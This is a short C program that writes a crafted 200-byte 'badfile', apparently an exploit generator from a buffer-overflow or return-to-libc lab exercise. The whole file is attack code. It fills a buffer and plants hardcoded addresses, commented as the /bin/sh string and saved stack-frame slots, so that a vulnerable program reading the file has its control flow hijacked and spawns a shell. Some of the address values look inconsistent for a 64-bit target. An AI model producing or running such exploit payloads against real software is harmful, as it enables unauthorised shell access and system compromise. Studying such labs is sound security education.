#include<stdio.h>
#include<string.h>

int main(int argc, char **argv){
	char buf[200];
	FILE *badfile;
	
	memset(buf,0xaa,200);
	
	*(long *) &buf[70]= 0x7fffffffe46e; //address of bin/sh
	*(long *) &buf[66] = 0xffffffffffffdfe8;  // address of ebp+8
	*(long *) &buf[62] = 0xffffffffffffdfe4; // address of ebp+4
	
	badfile = fopen("./badfile", "xw");
	fwrite(buf,sizeof(buf),1,badfile);
	fclose(badfile);
}
